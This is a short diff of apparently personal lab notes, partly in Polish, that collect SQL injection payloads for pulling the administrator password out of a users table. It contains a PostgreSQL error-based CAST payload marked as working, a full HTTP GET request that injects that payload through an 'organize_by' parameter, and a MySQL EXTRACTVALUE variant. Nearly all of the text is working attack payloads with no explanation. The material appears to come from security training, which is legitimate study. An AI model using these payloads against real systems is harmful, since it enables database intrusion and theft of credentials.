@@ -2,6 +2,12 @@ Error-based (PostgreSQL CAST trick) - DZIALA
 CAST((SELECT+password+FROM+users+WHERE+username%3d'administrator')+AS+INT)
 
 
+GET /advanced_search?SearchTerm=z&organize_by=CAST((SELECT+password+FROM+users+WHERE+username%3d'administrator')+AS+INT)--&blogArtist= HTTP/2
+
+
+
+
+
 Jeśli baza to MySQL (inny silnik błędów)
 organize_by=(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator'))))
 
